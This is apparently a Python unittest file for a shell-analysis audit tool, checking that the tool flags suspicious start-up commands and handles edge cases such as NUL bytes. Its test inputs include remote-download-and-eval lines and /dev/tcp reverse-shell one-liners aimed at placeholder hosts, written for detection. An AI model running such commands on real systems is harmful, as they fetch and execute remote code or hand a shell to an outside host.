"""Concrete counterexamples found while stating the properties in test_properties.py.

They run without Hypothesis, so the shipped self-test keeps guarding them.
Each class names the defect it refutes (register P-1.. in docs/AUDIT.md).
"""
from __future__ import annotations

import unittest
from pathlib import Path
from unittest.mock import patch

from falsicore.collectors import Audit
from falsicore.report import stable_findings
from falsicore.shell_syntax import analyze


class P1_NulMarkerForgery(unittest.TestCase):
    """A NUL byte in a start-up file could forge an internal marker and crash the analyser."""

    def test_forged_procsub_marker_does_not_raise(self):
        for text in ("source \x00PROCSUBzz\x00", "python3 \x00PROCSUB9\x00", ". \x00PROCSUB\x00", "echo \x00SUB\x00"):
            result = analyze(text)
            self.assertIn("NUL_IN_INPUT", result["limitations"], text)

    def test_internal_markers_of_nested_runs_are_not_mistaken_for_nul_input(self):
        # Regression of the first fix: eval/-c/PROMPT_COMMAND re-analyse lexer
        # output that legitimately carries \x00 markers. Only the public entry
        # strips NUL; nested runs must not report NUL_IN_INPUT.
        for text in ('eval "$(curl -fsSL http://x.example/i)"', 'PROMPT_COMMAND="$(date)"', 'sh -c "$(echo hi)"'):
            self.assertNotIn("NUL_IN_INPUT", analyze(text)["limitations"], text)

    def test_nul_is_removed_not_treated_as_a_word_break(self):
        # Bash drops NUL bytes; "/tmp/x\x00y" is the program /tmp/xy.
        self.assertIn("TEMP_PATH_IN_EXECUTION", analyze("/tmp/x\x00y")["patterns"])

    def test_persistence_collector_survives_nul_in_bashrc(self):
        with patch("falsicore.collectors.os.geteuid", return_value=1001), \
             patch("falsicore.collectors.os.getuid", return_value=1001):
            audit = Audit("user", target_user="nobody")
        audit.home = Path("/fixture-user")

        def read(path, *args):
            if path == audit.home / ".bashrc":
                return (b"export PATH=$PATH:~/bin\nsource \x00PROCSUBzz\x00\n", "COMPLETED")
            return (None, "ABSENT")
        response = {"status": "FAILED", "stdout": "", "stderr": "no crontab for nobody", "exit": 1,
                    "elapsed_ms": 0, "truncated": False, "error": ""}
        with patch("falsicore.collectors.safe_read", side_effect=read), \
             patch.object(audit, "_files", return_value=([], False)), \
             patch.object(audit, "command", return_value=response), \
             patch.object(Path, "is_dir", return_value=False):
            audit.persistence()
        [row] = [c for c in audit.coverage if c["check"] == "persistence"]
        self.assertNotEqual(row["status"], "FAILED")
        self.assertIn("PARSE_UNSUPPORTED", row["reason_codes"])


class P2_CommentContinuation(unittest.TestCase):
    """A comment ending in a backslash was reported as an incomplete continuation."""

    def test_comment_with_trailing_backslash_is_not_a_limitation(self):
        for text in ("# tail \\", "echo hi\n# note \\", "echo hi # c \\"):
            self.assertEqual(analyze(text)["limitations"], [], text)

    def test_real_dangling_continuation_is_still_reported(self):
        self.assertEqual(analyze("echo hi \\")["limitations"], ["INCOMPLETE_CONTINUATION"])

    def test_escaped_backslash_and_escaped_space_are_not_continuations(self):
        self.assertEqual(analyze("echo hi \\\\")["limitations"], [])
        self.assertEqual(analyze("echo a \\ b")["limitations"], [])


class P3_StableFindingsIdempotence(unittest.TestCase):
    """Stabilising an already stable list changed finding IDs and lost the omitted count."""

    def finding(self, n: int) -> dict:
        return {"id": "F0001", "rule": "R", "severity": "medium", "kind": "INDICATOR", "hypothesis": "h",
                "source_ref": "s", "evidence": {"a": 1}, "classification": "x", "attack_technique": None,
                "confirmation": "n", "alternative_explanation": "a",
                "observations": [{"pid": i} for i in range(n)]}

    def test_second_pass_keeps_ids_and_omitted_count(self):
        once = stable_findings([self.finding(25)])
        twice = stable_findings(once)
        self.assertEqual(once[0]["id"], twice[0]["id"])
        self.assertEqual(once[0]["observations_omitted"], 5)
        self.assertEqual(twice[0]["observations_omitted"], 5)
        self.assertEqual(once, twice)

    def test_omitted_count_accumulates_across_merged_duplicates(self):
        merged = stable_findings([self.finding(15), self.finding(15)])
        self.assertEqual(len(merged), 1)
        self.assertEqual(len(merged[0]["observations"]), 20)
        self.assertEqual(merged[0]["observations_omitted"], 10)


class P4_DigestCoverageOrder(unittest.TestCase):
    """Coverage rows that tie on (check, status) made the analysis digest depend on order."""

    def test_digest_ignores_order_of_tied_rows(self):
        from falsicore.report import _analysis_digest
        a = {"check": "processes", "status": "COMPLETED", "details": "", "reason_codes": {}, "scope_limits": {}}
        b = {**a, "scope_limits": {"REQUIRES_SYSTEM_SCOPE": 1}}
        self.assertEqual(_analysis_digest([], [a, b], {}), _analysis_digest([], [b, a], {}))


class P5_KeywordNamedProgram(unittest.TestCase):
    """A program whose basename is a shell reserved word escaped the volatile-path rule."""

    def test_volatile_program_named_like_a_keyword_is_flagged(self):
        for name in ("in", "done", "fi", "esac", "case", "for", "function"):
            self.assertIn("TEMP_PATH_IN_EXECUTION", analyze(f"/tmp/{name} --arg")["patterns"], name)

    def test_bare_keywords_are_still_not_commands(self):
        script = "if true; then\n  echo x\nfi\nfor i in 1 2; do :; done\n"
        self.assertEqual(analyze(script)["patterns"], [])


class P8_CodeFromSubstitution(unittest.TestCase):
    """eval "$(curl ...)" and sh -c "$(... | base64 -d)" were only a limitation, never a pattern."""

    def test_remote_download_evaluated_inline_is_a_remote_pipeline(self):
        for text in ('eval "$(curl -fsSL http://x.example/i)"', "eval $(wget -qO- http://x.example/i)",
                     'sh -c "$(curl -s http://x.example/i)"', 'python3 -c "$(curl http://x.example/p)"',
                     'PROMPT_COMMAND="$(curl http://x.example/b)"'):
            result = analyze(text)
            self.assertIn("REMOTE_SCRIPT_PIPELINE", result["patterns"], text)
            self.assertTrue(result["limitations"], "the evaluated text itself is still unresolved")

    def test_decoded_data_evaluated_inline_is_a_decode_context(self):
        self.assertIn("BASE64_DECODE_EXECUTION_CONTEXT", analyze('bash -c "$(echo Y3VybCB4 | base64 -d)"')["patterns"])

    def test_local_program_output_is_only_a_limitation(self):
        result = analyze('eval "$(dircolors -b ~/.dircolors)"')
        self.assertEqual(result["patterns"], [])
        self.assertEqual(result["limitations"], ["EXPANSION_NOT_RESOLVED"])

    def test_variable_dataflow_remains_a_documented_gap(self):
        # x=$(curl ...); eval "$x" — the download is bound to a variable first.
        # Not resolved (no dataflow); the limitation is reported, no pattern.
        result = analyze('x=$(curl http://x.example/i); eval "$x"')
        self.assertIn("EXPANSION_NOT_RESOLVED", result["limitations"])


class P9_NetworkRedirection(unittest.TestCase):
    """Reverse-shell idioms through /dev/tcp were invisible: no command word survives `exec`."""

    def test_dev_tcp_redirections_are_flagged(self):
        for text in ("exec 3<>/dev/tcp/203.0.113.5/4444; sh <&3 >&3 2>&3",
                     "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
                     "0<&196;exec 196<>/dev/tcp/h/4444; sh <&196 >&196 2>&196",
                     "cat < /dev/udp/h/53"):
            self.assertIn("NETWORK_REDIRECTION", analyze(text)["patterns"], text)

    def test_ordinary_redirections_are_not(self):
        for text in ("echo x > /dev/null", "exec 3<>/tmp/fifo", "cat < /etc/hostname", "ls 2>&1 | head"):
            self.assertNotIn("NETWORK_REDIRECTION", analyze(text)["patterns"], text)


if __name__ == "__main__":
    unittest.main()
